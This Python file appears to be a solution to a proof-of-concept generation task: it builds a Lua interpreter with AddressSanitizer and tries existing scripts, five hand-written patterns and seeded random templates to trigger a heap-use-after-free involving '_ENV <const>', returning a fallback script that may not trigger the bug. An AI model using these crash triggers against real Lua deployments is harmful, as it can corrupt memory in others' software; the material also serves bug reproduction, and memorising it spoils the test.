import os
import tarfile
import tempfile
import subprocess
import shutil
import random
import textwrap


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_lua_")
        poc_bytes = None
        try:
            root = self._extract_root(src_path, tmpdir)
            lua_path = self._build_lua_with_asan(root)
            if not lua_path:
                return self._fallback_poc()

            # 1. Try existing .lua scripts in the repo (if any)
            poc_bytes = self._search_existing_scripts(root, lua_path)
            if poc_bytes:
                return poc_bytes

            # 2. Try a small set of hand-crafted patterns
            poc_bytes = self._try_manual_patterns(lua_path)
            if poc_bytes:
                return poc_bytes

            # 3. Randomized scripts around `_ENV <const>`
            poc_bytes = self._random_fuzz(lua_path, max_iter=400)
            if poc_bytes:
                return poc_bytes

            # 4. Fallback: simple deterministic script using `_ENV <const>`
            return self._fallback_poc()
        finally:
            try:
                shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    # Tarball extraction / project root detection                        #
    # ------------------------------------------------------------------ #
    def _extract_root(self, src_path: str, tmpdir: str) -> str:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            # If extraction fails, just return tmpdir (no project); later steps will fail gracefully.
            return tmpdir

        # Heuristic: if there is a single directory at top level, use it as root.
        entries = [os.path.join(tmpdir, name) for name in os.listdir(tmpdir)]
        dirs = [p for p in entries if os.path.isdir(p)]
        if len(dirs) == 1 and len(entries) == 1:
            root = dirs[0]
        else:
            root = tmpdir

        # Try to refine root by looking for src/lua.c
        best_root = root
        for dirpath, dirnames, filenames in os.walk(root):
            if "lua.c" in filenames and os.path.basename(dirpath) == "src":
                best_root = os.path.dirname(dirpath)
                break
        return best_root

    # ------------------------------------------------------------------ #
    # Build Lua with AddressSanitizer                                    #
    # ------------------------------------------------------------------ #
    def _patch_makefile_for_asan(self, mk_path: str) -> None:
        try:
            with open(mk_path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
        except Exception:
            return

        lines = text.splitlines()
        new_lines = []
        added_cflags = False
        added_ldflags = False

        for line in lines:
            stripped = line.strip()
            if not added_cflags and stripped.startswith("CFLAGS") and "=" in line:
                line = line + " -fsanitize=address -fno-omit-frame-pointer"
                added_cflags = True
            elif not added_ldflags and stripped.startswith("LDFLAGS") and "=" in line:
                line = line + " -fsanitize=address"
                added_ldflags = True
            new_lines.append(line)

        if not added_cflags:
            new_lines.append("CFLAGS += -fsanitize=address -fno-omit-frame-pointer")
        if not added_ldflags:
            new_lines.append("LDFLAGS += -fsanitize=address")

        try:
            with open(mk_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write("\n".join(new_lines))
        except Exception:
            pass

    def _build_lua_with_asan(self, root: str) -> str or None:
        # Find src directory (where lua.c usually lives)
        src_dir = None
        for dirpath, dirnames, filenames in os.walk(root):
            if "lua.c" in filenames and os.path.basename(dirpath) == "src":
                src_dir = dirpath
                break
        if src_dir is None:
            candidate = os.path.join(root, "src")
            if os.path.isdir(candidate):
                src_dir = candidate

        # Patch Makefile(s) with ASan flags if present
        patched = set()
        if src_dir:
            mk = os.path.join(src_dir, "Makefile")
            if os.path.exists(mk):
                self._patch_makefile_for_asan(mk)
                patched.add(os.path.abspath(mk))
        root_mk = os.path.join(root, "Makefile")
        if os.path.exists(root_mk) and os.path.abspath(root_mk) not in patched:
            self._patch_makefile_for_asan(root_mk)
            patched.add(os.path.abspath(root_mk))

        # Try several build commands; ignore failures and move on.
        build_cmds = []
        if os.path.exists(root_mk):
            build_cmds.append((root, ["make", "-j4", "linux"]))
            build_cmds.append((root, ["make", "-j4", "posix"]))
            build_cmds.append((root, ["make", "-j4"]))
        if src_dir and os.path.exists(os.path.join(src_dir, "Makefile")):
            build_cmds.append((src_dir, ["make", "-j4"]))

        for cwd, cmd in build_cmds:
            try:
                subprocess.run(
                    cmd,
                    cwd=cwd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=180,
                    check=False,
                )
            except Exception:
                continue

        # After building, search for 'lua' executable
        lua_path = self._find_lua_binary(root)
        return lua_path

    def _find_lua_binary(self, root: str) -> str or None:
        best = None
        for dirpath, dirnames, filenames in os.walk(root):
            for fname in filenames:
                if fname == "lua":
                    full = os.path.join(dirpath, fname)
                    if os.path.isfile(full) and os.access(full, os.X_OK):
                        # Prefer paths ending with /src/lua if multiple
                        if best is None:
                            best = full
                        else:
                            if "/src/" in full and "/src/" not in best:
                                best = full
        return best

    # ------------------------------------------------------------------ #
    # Running Lua scripts and checking for ASan heap-use-after-free      #
    # ------------------------------------------------------------------ #
    def _run_lua_path_check_asan(self, lua_path: str, script_path: str) -> bool:
        try:
            proc = subprocess.run(
                [lua_path, script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
                check=False,
            )
        except Exception:
            return False

        if proc.returncode == 0:
            return False
        stderr = proc.stderr
        if b"AddressSanitizer" in stderr and b"heap-use-after-free" in stderr:
            return True
        return False

    def _run_lua_code_check_asan(self, lua_path: str, code_bytes: bytes) -> bool:
        fd, path = tempfile.mkstemp(suffix=".lua", prefix="poc_code_")
        try:
            os.write(fd, code_bytes)
            os.close(fd)
            return self._run_lua_path_check_asan(lua_path, path)
        finally:
            try:
                os.close(fd)
            except Exception:
                pass
            try:
                os.unlink(path)
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    # 1. Search for existing .lua tests that already trigger the bug     #
    # ------------------------------------------------------------------ #
    def _search_existing_scripts(self, root: str, lua_path: str) -> bytes or None:
        for dirpath, dirnames, filenames in os.walk(root):
            for fname in filenames:
                if not fname.endswith(".lua"):
                    continue
                full = os.path.join(dirpath, fname)
                try:
                    with open(full, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                # Quick heuristic: only try files that mention _ENV or <const>
                lower = data.lower()
                if b"_env" not in lower and b"<const>" not in data:
                    continue

                if self._run_lua_path_check_asan(lua_path, full):
                    return data
        return None

    # ------------------------------------------------------------------ #
    # 2. Manual candidate patterns                                       #
    # ------------------------------------------------------------------ #
    def _try_manual_patterns(self, lua_path: str) -> bytes or None:
        patterns = []

        p1 = """
        local _ENV <const> = { }

        local function make()
          local function inner()
            return _ENV
          end
          return inner
        end

        local f = make()
        collectgarbage()
        f()
        """
        patterns.append(p1)

        p2 = """
        local function make()
          local _ENV <const> = { }
          local function inner()
            return _ENV
          end
          return inner
        end

        local holder = {}
        for i = 1, 16 do
          holder[i] = make()
        end

        collectgarbage()
        for i = 1, 16 do
          holder[i]()
        end
        """
        patterns.append(p2)

        p3 = """
        local debug = debug

        local function with_env()
          local _ENV <const> = { }
          local function inner(n)
            if n == 0 then return 0 end
            return inner(n - 1)
          end
          return inner
        end

        local count = 0
        local function hook()
          count = count + 1
          if count == 1 then
            collectgarbage()
          else
            debug.sethook()
          end
        end

        debug.sethook(hook, "", 1)
        local f = with_env()
        f(4)
        """
        patterns.append(p3)

        p4 = """
        local debug = debug

        local function new_finalizer(fn)
          local co = coroutine.create(function() end)
          debug.setmetatable(co, { __gc = fn })
          co = nil
        end

        local holder

        local function make()
          local _ENV <const> = { }
          local function inner()
            return _ENV, holder
          end
          holder = inner
        end

        new_finalizer(function()
          make()
          collectgarbage()
        end)

        make()
        collectgarbage()
        if holder then holder() end
        """
        patterns.append(p4)

        p5 = """
        local function outer()
          local _ENV <const> = { }
          local function middle()
            local _ENV <const> = { }
            local function inner(n)
              if n <= 0 then return _ENV end
              return inner(n - 1)
            end
            return inner
          end
          return middle
        end

        local m = outer()
        local list = {}
        for i = 1, 8 do
          list[i] = m()
        end

        collectgarbage()
        for i = 1, 8 do
          list[i](5)
        end
        """
        patterns.append(p5)

        for src in patterns:
            code = textwrap.dedent(src).encode("utf-8")
            if self._run_lua_code_check_asan(lua_path, code):
                return code
        return None

    # ------------------------------------------------------------------ #
    # 3. Randomized scripts focused on `_ENV <const>`                    #
    # ------------------------------------------------------------------ #
    def _random_fuzz(self, lua_path: str, max_iter: int = 400) -> bytes or None:
        rnd = random.Random(0xC0FFEE)
        for i in range(max_iter):
            template_idx = i % 3
            if template_idx == 0:
                code_str = self._generate_template_a(rnd)
            elif template_idx == 1:
                code_str = self._generate_template_b(rnd)
            else:
                code_str = self._generate_template_c(rnd)

            code_bytes = code_str.encode("utf-8")
            if self._run_lua_code_check_asan(lua_path, code_bytes):
                return code_bytes
        return None

    def _generate_template_a(self, rnd: random.Random) -> str:
        N1 = rnd.randint(1, 6)
        N2 = rnd.randint(1, 6)
        depth = rnd.randint(2, 6)
        tmpl = """
        local debug = debug

        local function new_finalizer(fn)
          local co = coroutine.create(function() end)
          debug.setmetatable(co, { __gc = fn })
        end

        local holders = {}

        local function make_closure(id)
          local _ENV <const> = { id = id, holders = holders }
          local x = { id }
          local function inner(n)
            if n <= 0 then
              return holders, _ENV, x[1]
            else
              return inner(n - 1)
            end
          end
          holders[#holders + 1] = inner
          return inner
        end

        for i = 1, %(N1)d do
          make_closure(i)
        end

        new_finalizer(function()
          for i = 1, %(N2)d do
            make_closure(i + 1000)
          end
          collectgarbage()
        end)

        collectgarbage()
        for i = 1, #holders do
          pcall(holders[i], %(DEPTH)d)
        end
        """
        return textwrap.dedent(tmpl % {"N1": N1, "N2": N2, "DEPTH": depth})

    def _generate_template_b(self, rnd: random.Random) -> str:
        depth = rnd.randint(2, 6)
        c1 = rnd.randint(1, 3)
        c2 = c1 + rnd.randint(1, 3)
        tmpl = """
        local debug = debug

        local function work()
          local _ENV <const> = { }
          local function inner(n)
            if n == 0 then return 0 end
            return inner(n - 1)
          end
          return inner
        end

        local count = 0
        local function hook()
          count = count + 1
          if count == %(C1)d then
            collectgarbage()
          elseif count == %(C2)d then
            debug.sethook()
          end
        end

        debug.sethook(hook, "", 1)
        pcall(work(), %(DEPTH)d)
        debug.sethook()
        """
        return textwrap.dedent(tmpl % {"C1": c1, "C2": c2, "DEPTH": depth})

    def _generate_template_c(self, rnd: random.Random) -> str:
        N1 = rnd.randint(2, 10)
        depth = rnd.randint(2, 6)
        tmpl = """
        local function outer()
          local _ENV <const> = { }
          local function middle()
            local _ENV <const> = { }
            local function inner(n)
              if n <= 0 then return _ENV end
              return inner(n - 1)
            end
            return inner
          end
          return middle
        end

        local m = outer()
        local list = {}
        for i = 1, %(N1)d do
          list[i] = m()
        end

        collectgarbage()
        for i = 1, %(N1)d do
          pcall(list[i], %(DEPTH)d)
        end
        """
        return textwrap.dedent(tmpl % {"N1": N1, "DEPTH": depth})

    # ------------------------------------------------------------------ #
    # 4. Fallback PoC (very small, may or may not trigger the bug)      #
    # ------------------------------------------------------------------ #
    def _fallback_poc(self) -> bytes:
        code = """
        -- Fallback PoC: simple use of local `_ENV <const>`
        local _ENV <const> = { print = print }
        print("fallback env const test")
        """
        return textwrap.dedent(code).encode("utf-8")
